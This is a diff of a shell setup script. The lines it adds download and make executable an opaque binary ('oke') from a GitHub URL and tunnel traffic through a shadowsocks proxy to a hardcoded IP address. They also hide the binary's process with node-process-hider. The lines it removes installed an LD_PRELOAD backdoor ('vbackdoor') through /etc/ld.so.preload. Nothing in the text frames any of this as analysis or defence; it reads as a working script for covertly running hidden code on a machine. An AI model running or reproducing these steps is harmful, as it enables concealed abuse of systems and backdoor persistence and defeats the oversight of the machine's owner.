@@ -1,4 +1,11 @@
-#!/bin/sh
+#!/bin/bash
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
@@ -18,24 +25,16 @@ END
 
 sleep .2
 
-echo " "
-echo " "
-
-echo " "
-
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
 echo " "
 
-echo " "
+wget https://raw.githubusercontent.com/hondacars/xxx/main/oke
+chmod +x oke
 
-echo " "
-echo " "
+apt -y install shadowsocks-libev rng-tools
 
-./graftcp/graftcp git clone https://github.com/veo/vbackdoor.git
-cd vbackdoor
-vi vbackdoor.c
-make
-sudo mv vbackdoor.so /usr/local/lib/
-echo /usr/local/lib/vbackdoor.so >> /etc/ld.so.preload
+ss-local -s 51.15.84.147 -p 8388 -l 9999 -k 6JPSE -m chacha20-ietf-poly1305 -v &
+
+ph add oke
